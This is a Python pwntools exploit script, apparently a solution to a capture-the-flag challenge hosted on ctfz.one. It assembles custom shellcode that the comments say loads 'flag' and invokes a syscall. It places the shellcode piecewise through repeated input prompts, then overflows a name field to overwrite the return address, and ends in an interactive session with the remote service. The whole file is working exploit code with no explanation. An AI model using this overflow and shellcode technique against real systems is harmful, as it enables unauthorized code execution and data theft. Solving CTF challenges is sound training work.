from pwn import *

# eax = ( 'f', 'l')
part1 = ("\x31\x60\x30\x30\x55\x55\x55\x55\x55\x55"+
         "\x31\x63\x56\x5c\x55\x55\x55\x55\x55\x55"+
         "\x32\x30")

# eax = ( 'a', 'g')
part2 = ("\x31\x61\x30\x30\x55\x55\x55\x55\x55\x55"+
         "\x31\x63\x51\x57\x55\x55\x55\x55\x55\x55"+
         "\x32\x31")

# syscall 0x40
part3 = ("\x49\x40")



rotip = "\x33\x61"
queue = "A"*(64-4)
padding = "\x55\x55"
shellcode = part1+part2+part3


#r = remote("0.0.0.0",1337)
r = remote("pwn-02.v7frkwrfyhsjtbpfcppnu.ctfz.one",1337)


# Place shellcode on the complex axis 
r.sendline(str(len(shellcode)//2))
r.recvuntil("Input:")
r.send(rotip+shellcode[0:2]+queue)

for i in range(2,len(shellcode),2):
    r.recvuntil("Input:")
    r.send(padding+shellcode[i:i+2]+queue)

# Overwrite return address
r.recvuntil("How many letters:")
r.sendline("17")
r.recvuntil("Your name please:")
r.send("XX"*16+"\x40\x45")

r.interactive()
